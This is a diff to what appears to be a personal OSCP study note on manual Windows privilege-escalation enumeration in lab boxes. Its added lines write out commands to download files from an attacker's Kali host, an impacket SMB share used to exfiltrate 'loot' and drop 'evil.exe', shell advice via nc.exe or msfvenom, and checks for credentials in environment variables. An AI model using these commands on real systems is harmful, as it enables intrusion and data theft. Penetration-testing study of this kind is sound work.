@@ -4,7 +4,7 @@ I will do **Manual Enumeration** before running WinPEAS.
 
 Now repeat that five times.
 
-Many OSCP boxes are designed in a way where WinPEAS will not pick it up.
+Many OSCP boxes are designed in a way where WinPEAS will not pick the PE up. But still run it once you are done with the checks below.
 
 I assumed you got some kind of shell on a Windows host. If it is a shell from a webshell, try upgrading to a more stable shell by popping one with nc.exe (which you need to transfer from your kali) or a msfvenom payload.
 
@@ -27,7 +27,39 @@ certutil.exe -urlcache -split -f http://<kali ip>/<file you want to transfer> <o
 The powershell equivalent is:
 
 ```powershell
-iwr 
+iwr -uri http://<kali ip>:<port>/<file> -OutFile <outfile name>
+```
+
+Another fun way of doing it creating a smbshare on kali and then mounting it. This allows for bidrectional data transfers so you can exfiltrate files out of the target.
+
+```bash
+# on your kali
+# your share name can be anything you like. If you want the cwd to be the share path, you can just put . I usually set up with a username and password as sometimes Windows does not allow you to mount an authentication-less share
+
+impacket-smbserver -smb2support <share name> <local share path> -username kali -password kali
+
+# example. This creates a share called exfil with the path being the directory where impacket-smbserver is being run
+
+impacket-smbserver -smb2support exfil . -username kali -password kali
+
+```
+
+On your windows machine
+
+```cmd
+# mounts your exfil share on y drive and pass in kali:kali credentials
+
+net use y: \\<kali ip>\exfil kali /user:kali
+```
+now you can copy files to and fro
+```cmd
+#copy loot.txt from target to your kali
+
+copy loot.txt \\<kali ip>\exfil\loot.txt
+```
+copy evil.exe from kali to your target
+```cmd
+copy \\<kali ip>\exfil\evil.exe evil.exe
 ```
 
 
@@ -53,7 +85,13 @@ whoami /priv
 whoami /groups
 ```
 
-2) Systeminfo
+2) Environment Variables. Sometimes there are hardcoded stuff like creds in your env so give it a quick check
+
+```cmd
+SET
+```
+
+3) Systeminfo
 
 - Check the OS version and note the patches. If it looks ancient like Windows 7 or Windows Server 2012 or earlier, a kernel exploit like EternalBlue might be the solution. That said, I wont expect to see this in OSCP though you may see it for PG boxes. 
 
@@ -61,7 +99,7 @@ whoami /groups
 systeminfo
 ```
 
-3) Check the C:\Users directory. This helps you enumerate users and see (or not see) what access you have to their folders as the current user. 
+4) Check the C:\Users directory. This helps you enumerate users and see (or not see) what access you have to their folders as the current user. 
 
 - Note down any files that look out of place and exfiltrate them if required.
 
@@ -72,3 +110,22 @@ cd C:\Users
 tree /f /a  #this lists the current path in a recursive manner and also reveals hidden files and directories. This is a GREAT command. use this often
 
 ```
+
+5) Now check the C:\ root directory. See anything that is NOT Users,Windows,Program Files, Program Files (x86)? *P.S you can safely ignore output.txt. That seems to be some kind of logging for OffSec boxes*
+
+- If there is, investigate the folder. Are there files inside? Can you write into that folder? Can you edit the files? Can you see the contents of the files?
+
+6) If there is a webserver on the host, can you find the root of that webserver and check for config files? 
+
+7) Are there local services? *You can ignore port 53 if you see it* If there are, note it down. If it looks interesting, transfer a ligolo agent and set it up for you to access the local service. 
+
+```cmd
+netstat -ano
+
+# On Powershell
+
+Get-Process <PID of interest from the netstat>
+
+```
+
+Well that is about it. If there is nothing so far, it is likely to be related to services or scheduled tasks or some senstive file buried in the filesystem which winpeas can do for you.
